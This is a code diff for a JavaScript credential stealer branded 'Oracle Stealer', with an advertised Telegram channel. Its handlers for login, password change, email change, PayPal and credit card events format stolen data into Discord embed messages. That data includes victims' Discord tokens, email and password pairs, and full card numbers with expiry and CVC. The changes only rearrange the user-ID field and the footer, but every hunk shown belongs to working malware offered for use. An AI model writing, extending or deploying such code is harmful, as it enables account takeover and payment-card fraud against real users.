@@ -325,7 +325,7 @@ const login = async (email, password, token) => {
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+                name: json.username + "#" + json.discriminator,
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -354,6 +354,11 @@ const login = async (email, password, token) => {
                 value: `${billing}`,
                 inline: true,
               },
+              {
+                name: "ID:",
+                value: json.id,
+                inline: true,
+              },
             ],
             author: {
               name: "Oracle Stealer",
@@ -363,7 +368,7 @@ const login = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: json.id,
+              text: "t.me/oraclestealer",
         },
       },
     ],
@@ -385,7 +390,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + " (" + json.id + ")",
+                name: json.username + "#" + json.discriminator,
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -419,6 +424,11 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                 value: `${billing}`,
                 inline: true,
               },
+              {
+                name: "ID:",
+                value: json.id,
+                inline: true,
+              },
             ],
             author: {
               name: "Oracle Stealer",
@@ -428,7 +438,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: json.id,
+              text: "t.me/oraclestealer",
         },
       },
     ],
@@ -450,7 +460,7 @@ const emailChanged = async (email, password, token) => {
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + " (" + json.id + ")",
+                name: json.username + "#" + json.discriminator,
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -479,6 +489,11 @@ const emailChanged = async (email, password, token) => {
                 value: `${billing}`,
                 inline: true,
               },
+              {
+                name: "ID:",
+                value: json.id,
+                inline: true,
+              },
             ],
             author: {
               name: "Oracle Stealer",
@@ -488,7 +503,7 @@ const emailChanged = async (email, password, token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: json.id,
+              text: "t.me/oraclestealer",
         },
       },
     ],
@@ -510,7 +525,7 @@ const PaypalAdded = async (token) => {
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + " (" + json.id + ")",
+                name: json.username + "#" + json.discriminator,
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -539,6 +554,11 @@ const PaypalAdded = async (token) => {
                 value: "<:paypal:973924768933875722>",
                 inline: true,
               },
+              {
+                name: "ID:",
+                value: json.id,
+                inline: true,
+              },
             ],
             author: {
               name: "Oracle Stealer",
@@ -548,7 +568,7 @@ const PaypalAdded = async (token) => {
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: json.id,
+              text: "t.me/oraclestealer",
         },
       },
     ],
@@ -570,7 +590,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, email, password, to
             color: config.embed_color,
             fields: [
               {
-                name: json.username + "#" + json.discriminator + " (" + json.id + ")",
+                name: json.username + "#" + json.discriminator,
                 value: `\`\`\`${token}\`\`\``,
                 inline: false,
               },
@@ -599,6 +619,11 @@ const ccAdded = async (number, cvc, expir_month, expir_year, email, password, to
                 value: `${number} | ${expir_month}/${expir_year} | ${cvc}`,
                 inline: false,
               },
+              {
+                name: "ID:",
+                value: json.id,
+                inline: true,
+              },
             ],
             author: {
               name: "Oracle Stealer",
@@ -608,7 +633,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, email, password, to
               url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
             },
             footer: {
-              text: json.id,
+              text: "t.me/oraclestealer",
         },
       },
     ],
